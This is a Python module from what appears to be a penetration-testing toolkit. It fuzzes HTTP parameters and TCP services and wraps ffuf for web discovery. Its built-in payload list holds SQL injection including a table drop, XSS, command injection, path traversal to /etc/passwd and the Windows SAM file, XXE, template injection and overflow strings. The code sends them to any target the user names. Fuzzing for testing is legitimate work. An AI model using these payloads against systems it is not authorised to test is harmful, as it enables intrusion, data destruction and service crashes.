"""Fuzzer Engine — Protocol and parameter fuzzing toolkit.

HTTP parameter fuzzing, custom protocol fuzzing (TCP/UDP),
mutation-based payload generation, and crash monitoring.
"""

import sys
import os
import random
import string
import socket
import time
import threading
from datetime import datetime

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from ui import (console, show_stage_header, show_menu, ask, info, success,
                warning, error, confirm, show_results_panel)
from executor import run_command, run_with_preview
from session import log_command, save_finding

# ─── Mutation Engine ──────────────────────────────────────────────────────────

FUZZ_STRINGS = [
    # Buffer overflow / format strings
    "A" * 256, "A" * 1024, "A" * 4096, "A" * 10000,
    "%s" * 50, "%x" * 50, "%n" * 20, "%p" * 50,
    # SQL injection
    "' OR 1=1 --", "\" OR 1=1 --", "1'; DROP TABLE users; --",
    "' UNION SELECT NULL,NULL,NULL --", "1 AND 1=1", "1 AND 1=2",
    "1' AND '1'='1", "admin'--", "') OR ('1'='1",
    # XSS
    "<script>alert(1)</script>", "<img onerror=alert(1) src=x>",
    "<svg/onload=alert(1)>", "javascript:alert(1)",
    "'\"><script>alert(1)</script>", "<body onload=alert(1)>",
    # Command injection
    "; id", "| id", "` id `", "$(id)", "&& id", "|| id",
    "; cat /etc/passwd", "| cat /etc/passwd",
    # Path traversal
    "../../etc/passwd", "..\\..\\windows\\system32\\config\\sam",
    "....//....//etc/passwd", "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc/passwd",
    # LDAP injection
    "*()|&'", "admin)(&)", "admin)(!(&(|", "*)(objectClass=*)",
    # XML/XXE
    "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
    # SSTI
    "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{7*7}",
    "{{config}}", "{{self.__class__}}", "${T(java.lang.Runtime).getRuntime()}",
    # Special chars
    "\x00", "\r\n", "\n" * 100, "\t" * 100,
    "\xff" * 100, "\x00" * 100,
    # Integer overflow
    "0", "-1", "2147483647", "-2147483648", "4294967295",
    "99999999999999999999", "0x7FFFFFFF",
    # Null / empty
    "", " ", "null", "None", "undefined", "NaN", "Infinity",
    "true", "false", "[]", "{}", "0",
]

HTTP_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD", "TRACE"]

CONTENT_TYPES = [
    "application/json", "application/xml", "application/x-www-form-urlencoded",
    "multipart/form-data", "text/plain", "text/html",
]


def _mutate(payload):
    """Apply random mutation to a payload."""
    mutations = [
        lambda s: s.upper(),
        lambda s: s.lower(),
        lambda s: s * random.randint(2, 10),
        lambda s: s[::-1],
        lambda s: s.replace(" ", "%20"),
        lambda s: s.replace("'", "''"),
        lambda s: s + "\x00",
        lambda s: s + "A" * random.randint(100, 1000),
        lambda s: "".join(f"%{ord(c):02x}" for c in s),
        lambda s: s.encode().hex(),
    ]
    return random.choice(mutations)(payload)


def _generate_payloads(count=100):
    """Generate mutation-based fuzz payloads."""
    payloads = list(FUZZ_STRINGS)
    while len(payloads) < count:
        base = random.choice(FUZZ_STRINGS)
        payloads.append(_mutate(base))
    return payloads[:count]


# ─── HTTP Fuzzer ──────────────────────────────────────────────────────────────

def _http_fuzzer(session):
    """Fuzz HTTP parameters."""
    import urllib.request
    import urllib.parse
    import urllib.error

    url = ask("Target URL (e.g. http://target/page)")
    param = ask("Parameter to fuzz")
    method = ask("HTTP method", default="GET")
    count = int(ask("Number of payloads", default="50"))

    payloads = _generate_payloads(count)
    results = []
    console.print(f"\n[bold cyan]Fuzzing {url} — parameter '{param}'[/bold cyan]")
    console.print(f"[dim]Payloads: {len(payloads)} | Method: {method}[/dim]\n")

    interesting_codes = set()
    interesting_sizes = {}
    baseline_size = None

    for i, payload in enumerate(payloads):
        try:
            if method.upper() == "GET":
                test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                req = urllib.request.Request(test_url, method="GET")
            else:
                data = urllib.parse.urlencode({param: payload}).encode()
                req = urllib.request.Request(url, data=data, method=method.upper())

            req.add_header("User-Agent", "HackAssist-Fuzzer/1.0")
            resp = urllib.request.urlopen(req, timeout=10)
            code = resp.getcode()
            body = resp.read()
            size = len(body)

            if baseline_size is None:
                baseline_size = size

            # Detect interesting responses
            interesting = False
            if code not in (200, 301, 302):
                interesting = True
            if abs(size - baseline_size) > 100:
                interesting = True

            status = f"[{'green' if not interesting else 'yellow'}]{code}[/{'green' if not interesting else 'yellow'}]"
            if interesting:
                console.print(
                    f"  [{i+1:3d}] {status} Size:{size:6d} "
                    f"[yellow]←[/yellow] {payload[:60]}"
                )
                results.append({"payload": payload, "code": code, "size": size})
                interesting_codes.add(code)

        except urllib.error.HTTPError as e:
            code = e.code
            if code not in (404, 400):
                console.print(
                    f"  [{i+1:3d}] [red]{code}[/red] "
                    f"[yellow]←[/yellow] {payload[:60]}"
                )
                results.append({"payload": payload, "code": code, "size": 0})
        except Exception:
            pass

    # Summary
    console.print(f"\n[bold green]Results:[/bold green]")
    console.print(f"  Payloads tested: {len(payloads)}")
    console.print(f"  Interesting responses: {len(results)}")
    if interesting_codes:
        console.print(f"  Status codes: {interesting_codes}")

    if session and results:
        save_finding(session, "fuzzing", f"HTTP fuzzing: {url}?{param}",
                     "medium", f"{len(results)} interesting responses found")


# ─── TCP Fuzzer ───────────────────────────────────────────────────────────────

def _tcp_fuzzer(session):
    """Fuzz a TCP service with raw payloads."""
    target = ask("Target IP")
    port = int(ask("Target port"))
    count = int(ask("Number of payloads", default="50"))
    timeout = float(ask("Timeout per payload (seconds)", default="2"))

    payloads = _generate_payloads(count)
    crashes = []

    console.print(f"\n[bold cyan]TCP Fuzzing {target}:{port}[/bold cyan]")
    console.print(f"[dim]Payloads: {len(payloads)} | Timeout: {timeout}s[/dim]\n")

    for i, payload in enumerate(payloads):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((target, port))

            # Read banner if any
            try:
                banner = sock.recv(1024)
            except socket.timeout:
                banner = b""

            # Send payload
            payload_bytes = payload.encode(errors='replace')
            sock.send(payload_bytes + b"\r\n")

            # Try to read response
            try:
                response = sock.recv(4096)
                resp_len = len(response)
            except socket.timeout:
                resp_len = 0

            sock.close()
            console.print(f"  [{i+1:3d}] [green]OK[/green] Size:{resp_len:6d} "
                          f"[dim]{payload[:40]}[/dim]")

        except ConnectionRefusedError:
            console.print(f"  [{i+1:3d}] [red]CRASH?[/red] Connection refused — "
                          f"service may have crashed! Payload: {payload[:40]}")
            crashes.append({"payload": payload, "index": i})
            time.sleep(2)  # Wait for service recovery
        except Exception as e:
            console.print(f"  [{i+1:3d}] [yellow]ERR[/yellow] {str(e)[:40]}")

    if crashes:
        console.print(f"\n[bold red]POTENTIAL CRASHES: {len(crashes)}[/bold red]")
        for c in crashes:
            console.print(f"  [red]Payload #{c['index']}:[/red] {c['payload'][:80]}")
        if session:
            save_finding(session, "fuzzing", f"TCP fuzzing crash: {target}:{port}",
                         "critical", f"{len(crashes)} potential crashes detected")


# ─── ffuf/wfuzz Wrapper ───────────────────────────────────────────────────────

def _web_fuzzer(session):
    """Wrapper for ffuf/wfuzz with smart defaults."""
    url = ask("Target URL (use FUZZ as placeholder)")
    if "FUZZ" not in url:
        url += "/FUZZ"
        info(f"Added FUZZ placeholder: {url}")

    options = [
        ("1", "Directory/file discovery"),
        ("2", "Parameter fuzzing"),
        ("3", "Subdomain / VHOST fuzzing"),
        ("4", "Custom wordlist"),
        ("0", "Back"),
    ]
    choice = show_menu(options)

    if choice == "0":
        return

    wordlists = {
        "1": "/usr/share/wordlists/dirb/common.txt",
        "2": "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt",
        "3": "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
    }

    wordlist = wordlists.get(choice)
    if choice == "4" or not wordlist or not os.path.exists(wordlist):
        wordlist = ask("Wordlist path")

    extensions = ""
    if choice == "1":
        extensions = ask("Extensions to check (e.g. php,html,txt)", default="")

    # Build ffuf command
    cmd = f"ffuf -u '{url}' -w {wordlist}"
    if extensions:
        cmd += f" -e .{extensions.replace(',', ',.')}"
    cmd += " -mc 200,301,302,403 -t 40 -o /tmp/ffuf_results.json -of json"

    run_with_preview(cmd, session, "fuzzing")


# ─── Menu ─────────────────────────────────────────────────────────────────────

def run(session):
    show_stage_header("Fuzzer Engine", "Mutation-based fuzzing for HTTP, TCP, and protocols")

    while True:
        options = [
            ("1", "[bold]HTTP Parameter Fuzzer[/bold] — Fuzz URL params with smart payloads"),
            ("2", "[bold]TCP Service Fuzzer[/bold] — Raw TCP fuzzing with crash detection"),
            ("3", "[bold]Web Fuzzer (ffuf/wfuzz)[/bold] — Directory & parameter discovery"),
            ("4", "[bold]Payload Generator[/bold] — Generate mutation-based payloads"),
            ("5", "[bold]Fuzz Strings Library[/bold] — View built-in fuzz strings"),
            ("0", "Back to Main Menu"),
        ]
        choice = show_menu(options)

        if choice == "0":
            return
        elif choice == "1":
            _http_fuzzer(session)
        elif choice == "2":
            _tcp_fuzzer(session)
        elif choice == "3":
            _web_fuzzer(session)
        elif choice == "4":
            count = int(ask("Number of payloads", default="20"))
            payloads = _generate_payloads(count)
            console.print(f"\n[bold cyan]Generated {len(payloads)} payloads:[/bold cyan]\n")
            for i, p in enumerate(payloads):
                console.print(f"  [{i+1:3d}] {p[:100]}")
        elif choice == "5":
            console.print(f"\n[bold cyan]Built-in Fuzz Strings ({len(FUZZ_STRINGS)}):[/bold cyan]\n")
            for i, s in enumerate(FUZZ_STRINGS):
                console.print(f"  [{i+1:3d}] {repr(s)[:100]}")
